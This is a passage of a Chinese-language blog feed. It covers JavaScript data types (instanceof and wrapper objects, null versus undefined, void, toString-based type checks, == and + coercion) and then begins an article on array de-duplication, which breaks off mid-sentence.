了，这样子的话左侧表达式的原型链在向上查找的过程中就找不到 Dog.prototype 了，结果自然返回的是 false。</p><h2 id="4-3-关于原始类型的包装类"><a href="#4-3-关于原始类型的包装类" class="headerlink" title="4.3. 关于原始类型的包装类"></a>4.3. 关于原始类型的包装类</h2><p>对于四个原始类型的包装类，Number, Boolean, String, Symbol 返回 false 的原因会有所不同，我们来看下面一个例子：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> str = <span class="string">"dog"</span>;</span><br><span class="line"><span class="built_in">console</span>.log(str <span class="keyword">instanceof</span> <span class="built_in">String</span>);   <span class="comment">// false</span></span><br><span class="line"><span class="built_in">console</span>.log(str.__proto__ === <span class="built_in">String</span>.prototype);    <span class="comment">// true</span></span><br></pre></td></tr></table></figure><p>按照这个结果，那前面的说法就不合逻辑了，str.__proto__ 都是 String.prototype，把这个逻辑套到前面的函数里去</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">instance_of(str, <span class="built_in">String</span>);   <span class="comment">// true</span></span><br></pre></td></tr></table></figure><p>返回的就是 true，但是偏偏实际 instanceof 操作符返回的就是 false，这是为什么呢？</p><p>在翻阅了一轮资料之后，在 StackOverflow 上看到了这么一个<a href="https://stackoverflow.com/questions/15705232/confusion-about-prototype-chain-primitives-and-objects" rel="external nofollow noopener noreferrer" target="_blank">答案</a>。</p><p>原来，在我们对原始类型变量使用成员访问符 <code>.</code> 的时候，js 会自动调起装箱机制（auto-boxes），临时把原始数据类型通过语言内置的包装类给转换成对应的对象类型，在这个例子中相当于自动做了 <code>new String(str)</code> 这一步，所以我们才能在原始类型的变量上访问到 __proto__ 属性。</p><p>换句话说，原始数据类型本身是根本没有 __proto__ 这个对象属性的，在直接使用 instanceof 操作符的时候，js 运行环境并不会自动调起装箱过程，原始数据类型也并没有 [[Prototype]] 属性，所以它的返回的是 false，这也导致了 instanceof 操作符有无法用于判断原始数据类型的弊端。</p><h1 id="5-关于-null-和-undefined"><a href="#5-关于-null-和-undefined" class="headerlink" title="5. 关于 null 和 undefined"></a>5. 关于 null 和 undefined</h1><p>javascript 有个非常独特的设计，就是 null 和 undefined 同时存在于这个语言中，这使得这门语言可以有两种表示空值的方法，这两个空值在使用过程中极其相似，比如<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="literal">undefined</span>) </span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'undefined is false'</span>);</span><br><span class="line"><span class="comment">// undefined is false</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="literal">null</span>) </span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'null is false'</span>);</span><br><span class="line"><span class="comment">// null is false</span></span><br><span class="line"></span><br><span class="line"><span class="literal">undefined</span> == <span class="literal">null</span></span><br><span class="line"><span class="comment">// true</span></span><br></pre></td></tr></table></figure></p><p>上面相等运算符甚至直接返回 true，很多开发者在实际开发中到底选择哪种也是随心所欲，根本没有去在乎过里面的区别，不过热衷于探索的我还是认为需要深究一下，它们之间究竟有什么区别呢？咱还是来看看定义吧。</p><h2 id="5-1-这两者在定义上的区别"><a href="#5-1-这两者在定义上的区别" class="headerlink" title="5.1. 这两者在定义上的区别"></a>5.1. 这两者在定义上的区别</h2><ul><li><code>null</code>，表示一个 “无” 的对象</li><li><code>undefined</code>，表示一个 “无” 的原始值</li></ul><p>typeof 返回值的区别<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typeof</span> <span class="literal">null</span>         <span class="comment">//object</span></span><br><span class="line"><span class="keyword">typeof</span> <span class="literal">undefined</span>    <span class="comment">//undefined</span></span><br></pre></td></tr></table></figure></p><p>Number 转换上的区别<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Number</span>(<span class="literal">null</span>)        <span class="comment">// 0</span></span><br><span class="line">+<span class="literal">null</span>               <span class="comment">// 0</span></span><br><span class="line"><span class="built_in">Number</span>(<span class="literal">undefined</span>)   <span class="comment">// NaN</span></span><br><span class="line">+<span class="literal">undefined</span>          <span class="comment">// NaN</span></span><br></pre></td></tr></table></figure></p><p>出现时机上的区别<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> name;</span><br><span class="line"><span class="built_in">console</span>.log(name); <span class="comment">//undefined</span></span><br><span class="line">name = <span class="string">'night'</span>;</span><br><span class="line"><span class="built_in">console</span>.log(name); <span class="comment">//night</span></span><br><span class="line">name = <span class="literal">null</span>;</span><br><span class="line"><span class="built_in">console</span>.log(name); <span class="comment">//null</span></span><br></pre></td></tr></table></figure></p><p>看完这三个例子，可以得出一些规律：</p><p><strong> 对于 null：</strong></p><ol><li>变量不主动赋值 null 的话是不会出现 null 的</li><li>null 在转换为数字的时候会被转换为 0</li><li>typeof null 的值返回的是 “object”</li></ol><p><strong> 对于 undefined：</strong></p><ol><li>变量在声明的时候会被默认初始化为 undefined</li><li>undefined 在转换为数字的时候会被转换为 NaN</li><li>typeof undefined 会返回的是 “undefined”</li></ol><h2 id="5-2-同时存在的历史原因"><a href="#5-2-同时存在的历史原因" class="headerlink" title="5.2. 同时存在的历史原因"></a>5.2. 同时存在的历史原因</h2><p>虽然我们得到了前面的规律，也可以看出来确实存在一些区别，可是这些区别直观的看过去它们实际上都是些无关痛痒的区别。按理说，这门语言其实只要一个空值就行了，两个空值在很多时候都作用重叠了，它为什么要这样子设计呢？</p><p>翻了一圈，看到了阮老师写的一篇 <a href="http://www.ruanyifeng.com/blog/2014/03/undefined-vs-null.html" rel="external nofollow noopener noreferrer" target="_blank">undefined 与 null 的区别</a>，里面提到了</p><blockquote><p>1995 年 JavaScript 诞生时，最初像 Java 一样，只设置了 null 作为表示 “无” 的值。</p><p>但是，JavaScript 的设计者 Brendan Eich，觉得这样做还不够，有两个原因。</p><p>首先，null 像在 Java 里一样，被当成一个对象。但是，JavaScript 的数据类型分成原始类型（primitive）和合成类型（complex）两大类，Brendan Eich 觉得表示 “无” 的值最好不是对象。</p><p>其次，JavaScript 的最初版本没有包括错误处理机制，发生数据类型不匹配时，往往是自动转换类型或者默默地失败。Brendan Eich 觉得，如果 null 自动转为 0，很不容易发现错误。</p><p>因此，Brendan Eich 又设计了一个 undefined。</p></blockquote><p>可见，undefined 是在 null 之后设计的，设计它的本意是希望能够补全 null 的不足，然而当真正这么实践的时候，却发现两个空值的作用和含义基本一致，当初只需要改进 null 值就好了，根本不需要多设计一个空值出来。</p><h2 id="5-3-二者的缺陷"><a href="#5-3-二者的缺陷" class="headerlink" title="5.3. 二者的缺陷"></a>5.3. 二者的缺陷</h2><p>即使 js 发展到了今天，其实不论是 null 还是 undefined，它们二者仍然存在着各自本身的缺陷。</p><p>先说下 null 值。前面也提到了，它作为原始数据类型，typeof null 的值返回 “object” 本身就是个巨大的设计缺陷，所以检测 null 值，用 typeof 是检测不出来的，一般建议下面这种方法：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isNull</span>(<span class="params">val</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> val === <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而检测对象的值，用 typeof 也没办法区分出 null 和真正的对象，所以要区分出真正的对象，还得用这种方法：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isEntityObject</span>(<span class="params">val</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> val &amp;&amp; <span class="keyword">typeof</span> val === <span class="string">"object"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再来看看 undefined 值的问题，undefined 按理说也应该是一个原始类型的值，然而如果你接触 js 不深的话，你一定做梦也想不到 undefined 竟然是一个全局变量！<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span>.hasOwnProperty(<span class="string">"undefined"</span>)    <span class="comment">// true</span></span><br></pre></td></tr></table></figure></p><p>因为它既不是 js 里的关键字也不是保留字，可以在 <a href="https://www.ecma-international.org/ecma-262/6.0/#sec-names-and-keywords" rel="external nofollow noopener noreferrer" target="_blank">规范</a> 里面看到，undefined 即不存在于关键字列表中，也不存在于保留字列表中，所以它理论上就是一个变量，是可以被任意修改覆盖的。比如</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="literal">undefined</span> = <span class="string">"oops"</span>;</span><br><span class="line">alert(<span class="literal">undefined</span>);</span><br></pre></td></tr></table></figure><p>据说这段代码在 IE9 以下真的会弹出 <code>oops</code>，有兴趣的可以试一下，不过现在的浏览器已经锁定了全局 undefined 的值，上面的操作已经不能够修改 undefined 的值了，但是这段代码这么执行也并不会报错，相比 null，给它赋值就会报错。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="literal">null</span> = <span class="number">1</span>;</span><br><span class="line">VM122:<span class="number">1</span> Uncaught <span class="built_in">SyntaxError</span>: Unexpected token <span class="literal">null</span></span><br></pre></td></tr></table></figure><p>然而，它也仅仅只是锁定了全局 undefined 的值，如果在局部声明一个 undefined 变量，它还是可以进行修改</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">!<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> <span class="literal">undefined</span> = <span class="string">"changed value"</span>;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="literal">undefined</span>);</span><br><span class="line">&#125;();</span><br><span class="line"><span class="comment">// changed value</span></span><br></pre></td></tr></table></figure><p>所以，要想获得唯一准确的 undefined 值，而不是想借用 undefined 变量的话，得走一条弯路：去构造一个 undefined 值，这时候，js 的一个老古董 <code>void</code> 关键字就派上用场了。</p><h2 id="5-4-巧用-void-关键字"><a href="#5-4-巧用-void-关键字" class="headerlink" title="5.4. 巧用 void 关键字"></a>5.4. 巧用 void 关键字</h2><p>对于这个关键字，其实我们并不陌生，我们以前经常会见到 <code>javascript:void(0);</code> 这种用法，它与 <code>&lt;a href=&quot;#&quot;&gt;link&lt;/a&gt;</code> 的区别是后者在点击了之后会跳到页面的最顶部去，改成用 <code>&lt;a href=&quot;javascript:void(0);&quot;&gt;link&lt;/a&gt;</code> 就可以避免这个问题。</p><p>说到底其实 void 这个关键字，它本身的作用只有一个，就是返回一个 undefined 值，它是一个一元操作符，无论后面传入什么参数进去，他都会返回 undefined，比如：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">void</span> <span class="string">"you are useless?"</span>;</span><br><span class="line"><span class="keyword">void</span> <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">void</span> [];</span><br><span class="line"><span class="keyword">void</span> /(useless)/ig;</span><br><span class="line"><span class="keyword">void</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123; <span class="built_in">console</span>.log(<span class="string">"you are so useless?"</span>); &#125;</span><br><span class="line"><span class="comment">//... always return undefined</span></span><br></pre></td></tr></table></figure><p>所以当我们需要使用真正的 undefined 值，而不是全局的 undefined 变量的时候，可以通过 void 关键字去生成一个出来，比如<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> scheduleFlush = <span class="keyword">void</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure></p><h1 id="6-利用-Class-精确判断数据类型"><a href="#6-利用-Class-精确判断数据类型" class="headerlink" title="6. 利用 [[Class]] 精确判断数据类型"></a>6. 利用 [[Class]] 精确判断数据类型</h1><p>看过了前面 typeof 让人失望的表现之后，再来看看我们到底应该如何稳妥的判断数据类型，目前来说，要检测基本数据类型和内置对象，最好的方法是使用 <code>toString</code> 函数来进行判断。</p><p>toString 函数是 Object.prototype 上的方法，所以所有对象都拥有 toString 方法，它可以返回对象内部属性 <strong>[[Class]]</strong> 的值。但 Array, Date 等对象会重写从 Object.prototype 继承来的 toString 方法，从而返回不同的对象值，下面是一些例子：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">toString.call(&#123;&#125;);          <span class="comment">// "[object Object]"</span></span><br><span class="line">toString.call(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;&#125;);     <span class="comment">// "[object Function]"</span></span><br><span class="line"></span><br><span class="line">toString.call([]);          <span class="comment">// "[object Array]"</span></span><br><span class="line">toString.call(<span class="regexp">/a/</span>);         <span class="comment">// "[object RegExp]"</span></span><br><span class="line">toString.call(<span class="built_in">JSON</span>);        <span class="comment">// "[object JSON]"</span></span><br><span class="line">toString.call(<span class="keyword">new</span> <span class="built_in">Date</span>());  <span class="comment">// "[object Date]"</span></span><br><span class="line"></span><br><span class="line">toString.call(<span class="number">0</span>);           <span class="comment">// "[object Number]"</span></span><br><span class="line">toString.call(<span class="literal">false</span>);       <span class="comment">// "[object Boolean]"</span></span><br><span class="line">toString.call(<span class="string">'foo'</span>);       <span class="comment">// "[object String]"</span></span><br><span class="line">toString.call(<span class="built_in">Symbol</span>());    <span class="comment">// "[object Symbol]"</span></span><br><span class="line"></span><br><span class="line">toString.call(<span class="literal">NaN</span>);         <span class="comment">// "[object Number]"</span></span><br><span class="line">toString.call(<span class="literal">Infinity</span>);    <span class="comment">// "[object Number]"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Since ECMAScript 5 （JavaScript 1.8.5）</span></span><br><span class="line">toString.call(<span class="literal">null</span>);        <span class="comment">// "[object Null]"</span></span><br><span class="line">toString.call(<span class="literal">undefined</span>);   <span class="comment">// "[object Undefined]"</span></span><br></pre></td></tr></table></figure><p>可见 toString 函数几乎所有的内置类型都可以返回预期的正确结果，而且由于返回值是字符串，也可以用于解决前面所提到的跨 frame 判断数据类型的问题，这几乎是最理想的判断数据类型的方法了。</p><p>不过这里值得一提的是，基本数据类型 number, boolean, string, symbol 在调用 toString 这个函数的时候，也是用了包装类来进行隐式自动装箱的，所以它们返回的是首字母大写的 Number, Boolean, String, Symbol。</p><p>而对于 null 和 undefined，却不存在 Null 和 Undefined 这两个包装类，根据 ES2015 规范中对于 <a href="https://www.ecma-international.org/ecma-262/6.0/#sec-object.prototype.tostring" rel="external nofollow noopener noreferrer" target="_blank">toString 函数的定义</a></p><pre><code>1. If the this value is undefined, return &quot;[object Undefined]&quot;.2. If the this value is null, return &quot;[object Null]&quot;....</code></pre><p>可知，它们是在函数判断的时候直接返回的。也就是说，null 和 undefined 这两个值在 toString 函数处理的时候不需要经过装箱处理，内部代码在直接判断的过程中就进行了返回。</p><p><code>toString</code> 也不是完美的，它无法检测用户自定义类型。 因为 Object.prototype 是不知道用户会创造什么类型的， 它只能检测 ECMA 标准中的那些内置类型。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">toString.call(<span class="keyword">new</span> Dog())   <span class="comment">// [object Object]</span></span><br></pre></td></tr></table></figure><p>所以如果你要判断的是基本数据类型或 JavaScript 内置对象，推荐使用 <code>toString</code>，如果要判断的时自定义对象类型，还是得使用 <code>instanceof</code> 操作符。</p><h1 id="7-弱相等运算符在判断时的类型转换"><a href="#7-弱相等运算符在判断时的类型转换" class="headerlink" title="7. 弱相等运算符在判断时的类型转换"></a>7. 弱相等运算符在判断时的类型转换</h1><p>说到这个，不得不提一个经典的例子</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[]==![]   <span class="comment">// true</span></span><br></pre></td></tr></table></figure><p>这个例子按照常识，右边的 [] 是 Object 类型，在 <code>!</code> 运算符取反后应该等于 false，而左边的 [] 是 Object，所有的 Object 应该都会被转成 true，所以 true == false 返回的应该是 false 才对，但是怎么就偏偏返回了个 true 呢？</p><p>说到底，还是对这个运算符的了解不够深造成的，对 == 运算符运算过程的理解太想当然了，其实这个运算符真正的内部执行过程是这样的：</p><pre><code>[] == ![]==&gt; [] == false==&gt; [] == ToNumber(false)==&gt; [] == 0==&gt; ToPrimitive([]) == 0==&gt; &quot;&quot; == 0==&gt; ToNumber(&quot;&quot;) == 0==&gt; 0 == 0==&gt; true</code></pre><p>至于到底为什么会这样子算，可以详细看看<a href="https://github.com/jawil/blog/issues/1" rel="external nofollow noopener noreferrer" target="_blank">这篇文章</a>，简单来说就是根据 ECMA 规范的定义，这个运算符会在内部不断的做类型转换。它的转换规则是这样的：</p><p><img src="/images/2018/06/data-transformation-of-abstract-equality-omparison.jpeg" alt="运算规则图"></p><ul><li>null == undefined 为 true，且它俩与所有其他值比较的结果都是 false。</li><li>Object 类型在与 Boolean/String/Number 进行运算时，会先调用 ToPrimitive 函数转换为原始类型（内部会尝试调用 <code>valueOf()</code> 方法，如果得到的结果不是基本数据类型，那再调用 <code>toString()</code> 方法）</li><li>String 类型与 Boolean 类型进行运算时，两边都会先调用 ToNumber 函数转换为 Number 类型</li><li>Number 与 String/Boolean 类型进行运算时，String/Boolean 类型的一方会先调用 ToNumber 函数转换为 Number 类型</li><li>数值 NaN 与任何值都不相等，包括 NaN 本身也不相等（<a href="https://en.wikipedia.org/wiki/IEEE_754" rel="external nofollow noopener noreferrer" target="_blank">IEEE-754 浮点数标准</a>定义的）</li></ul><p>通过这个转换规则就可以很容易解释前面为什么 <code>[] == ![]</code> 的结果为 true 了</p><h1 id="8-加法运算符在运算时的类型转换"><a href="#8-加法运算符在运算时的类型转换" class="headerlink" title="8. 加法运算符在运算时的类型转换"></a>8. 加法运算符在运算时的类型转换</h1><p>这个也是前端的面试中经常会遇到的问题，下面列出几个例子和输出的结果</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> + <span class="string">"2"</span> <span class="comment">// "12"</span></span><br><span class="line"><span class="number">1</span> - <span class="string">"2"</span> <span class="comment">// -1</span></span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>] + [<span class="number">3</span>, <span class="number">4</span>] <span class="comment">// "1,23,4"</span></span><br></pre></td></tr></table></figure><p>可以发现跟前面 == 号在类型转换的时候，流程是不一样的，可以看到 <code>1 + &quot;2&quot;</code> 在运算的过程中，并不是字符串 “2” 转换成了数字 2，而是 1 变成了字符串 “1”</p><p><a href="JavaScript 中加号运算符的类型转换优先级是什么？ - zenoven 的回答 - 知乎 https://www.zhihu.com/question/21484710/answer/52389636">翻了一圈</a>，发现转换规则是这样的：  </p><ol><li>将 A 和 B 都转换为原始值(primitive，执行 ToPrimitive)，这里记为 A1，B1</li><li>如果 A1 和 B1 中有一个值为 string，则将 A1、B1 都转换为 string（执行 ToString），其值记为 A2、B2，将 A2 B2 连接后就是 A+B 的结果</li><li>否则的话将 A1、B1 都转换为 number（执行 ToNumber），其值记为 A3、B3，将 A3 B3 相加即为 A+B 的结果</li></ol><p>在这里最重要的是第二点，string 类型的判断会优先于 number，加法运算两边的操作数任意一个为 string，整个结果就应该为 string 类型的！</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;现在出来写前端有一段时间了，现在来回头看看，当初大学刚学搞前端的时候，为了快速适应新的语言，直接看后面的内容去了，跳过了基本数据类型的介绍，想当然的觉得 javascript 的数据类型应该也跟其他弱类型语言差不了太多，从而忽略了基本数据类型上的细节。最近随着对 js 语言了解和应用的加深，发现 js 的基本数据类型里面真的大有文章，甚至有不少的语言设计缺陷在里面。所以我打算专门写一篇关于基本数据类型的文章，专门来谈谈 js 在基本数据类型上的这些设计和缺陷。&lt;br&gt;
    
    </summary>
    
      <category term="技术研究" scheme="https://hexo.bangz.me/categories/%E6%8A%80%E6%9C%AF%E7%A0%94%E7%A9%B6/"/>
    
    
      <category term="javascript" scheme="https://hexo.bangz.me/tags/javascript/"/>
    
      <category term="前端" scheme="https://hexo.bangz.me/tags/%E5%89%8D%E7%AB%AF/"/>
    
      <category term="ECMAScript" scheme="https://hexo.bangz.me/tags/ECMAScript/"/>
    
  </entry>
  
  <entry>
    <title>从数组去重来看 javascript 的进化</title>
    <link href="https://hexo.bangz.me/archives/find-javascript-improvements-from-remove-duplicates.html"/>
    <id>https://hexo.bangz.me/archives/find-javascript-improvements-from-remove-duplicates.html</id>
    <published>2017-04-07T01:44:00.000Z</published>
    <updated>2018-06-08T09:50:32.000Z</updated>
    
    <content type="html"><![CDATA[<p>说到 javascript 数据去重，估计所有做前端的都并不陌生<br>数组去重的算法即使在实际生产中不一定用的多，但是在面试中几乎成为了必考的题目<br>这是一个神奇的题目，看上去好像是死的，应该已经没有什么发挥空间了<br>但事实上它随着 ECMAScript 标准的发展，数据去重的实现反倒是在不断变化<br>许多公司甚至可以单从一个数组去重直接看出一个前端工程师的大致水平<br>今天我也来说说我所知道的 javascript 数组去重吧</p><a id="more"></a><h3 id="一、最传统的实现方式"><a href="#一、最传统的实现方式" class="headerlink" title="一、最传统的实现方式"></a>一、最传统的实现方式</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> array = [<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="literal">NaN</span>, <span class="string">'1'</span>, <span class="string">''</span>, <span class="literal">true</span>, <span class="literal">false</span>, <span class="literal">true</span>];</span><br><span class="line"><span class="keyword">var</span> result = [];</span><br><span class="line"><span class="keyword">var</span> i, j;</span><br><span class="line"><span class="keyword">var</span> flag;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; array.length; i++) &#123;</span><br><span class="line">  flag = <span class="literal">true</span>;</span><br><span class="line">  <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; result.length; j++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (array[i] === result[j]) &#123;</span><br><span class="line">      flag = <span class="literal">false</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (flag) &#123;</span><br><span class="line">    result.push(array[i]);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(result);</span><br><span class="line"><span class="comment">// 输出结果：[1, 0, NaN,"1","", true, false]</span></span><br></pre></td></tr></table></figure><p>这种写法在 ECMAScript 3 的标准（也就是 ECMA-262 第 3 版）下，还可以稍微缩写一下<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> array = [<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="literal">NaN</span>, <span class="string">'1'</span>, <span class="string">''</span>, <span class="literal">true</span>, <span class="literal">false</span>, <span class="literal">true</span>];</span><br><span class="line"><span class="built_in">Array</span>.prototype.uniq = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> result = [];</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.length; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (result.indexOf(<span class="keyword">this</span>[i]) === <span class="number">-1</span>) &#123;</span><br><span class="line">      result.push(<span class="keyword">this</span>[i]);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(array.uniq());</span><br><span class="line"><span class="comment">// 输出结果：[1, 0, NaN,"1","", true, false]</span></span><br></pre></td></tr></table></figure></p><p>这就是我所说的最传统的方式，几乎所有学过编程的都能想得到，逻辑简单粗暴，而且大多数情况下都管用</p><h3 id="二、借助-javascript-对象的特性来构造-hash-表实现去重"><a href="#二、借助-javascript-对象的特性来构造-hash-表实现去重" class="headerlink" title="二、借助 javascript 对象的特性来构造 hash 表实现去重"></a>二、借助 javascript 对象的特性来构造 hash 表实现去重</h3><p>上面最传统的写法，我说大多数情况下管用，没有说绝对好用，事实上是因为它确实有缺陷<br>比如当数组中存在多个 NaN 时：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var array = [1, 0, 1, NaN, &apos;1&apos;, &apos;&apos;, true, false, true, NaN];</span><br></pre></td></tr></table></figure></p><p>上面的第一种方法就会返回以下结果：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[1, 0, NaN, &quot;1&quot;, &quot;&quot;, true, false, NaN]</span><br></pre></td></tr></table></figure></p><p>可见，第一种方法无法去掉 NaN 的重复，所以后来有人就想到了第二种方法<br>借助 javascript 对象天然的 hash 特性来去除数组中重复的值<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> array = [<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="literal">NaN</span>, <span class="string">'1'</span>, <span class="string">''</span>, <span class="literal">true</span>, <span class="literal">false</span>, <span class="literal">true</span>, <span class="literal">NaN</span>];</span><br><span class="line"><span class="built_in">Array</span>.prototype.uniq = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> result = [], map = &#123;&#125;;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.length; i++) &#123;</span><br><span class="line">    map[<span class="keyword">this</span>[i]] = <span class="keyword">this</span>[i];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> key <span class="keyword">in</span> map) &#123;</span><br><span class="line">    result.push(map[key]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(array.uniq());</span><br><span class="line"><span class="comment">// 输出结果 [0,"1", NaN,"", true, false]</span></span><br></pre></td></tr></table></figure></p><p>去重成功，说明这种方法是可行的，而且这样子去重的速度比前面第一种方式要快得多，因为只有一层循环，所以时间复杂度为 O(n)<br>相比前面的两层循环（时间复杂度为Ο(<em>n</em>2)），确实有了质的提升。<br>不过输出结果似乎跟前面相比，除了 NaN 去掉了之外，数字 1 和字符串 1 也被当成重复的给去掉了<br>所以使用这种方法去重的时候，需要注意这种方法跟前面的去重方式相比，有一种本质性的不同<br>前面的去重是用三个等号判断的，也就是强类型去重，而这种使用 hash 表的去重方法，其实是借助转换成字符串的方式去重<br>这种借助 hash 表中的 key（字符串类型）的去重方式，不属于强类型去重，也不属于弱类型去重（因为 NaN == NaN 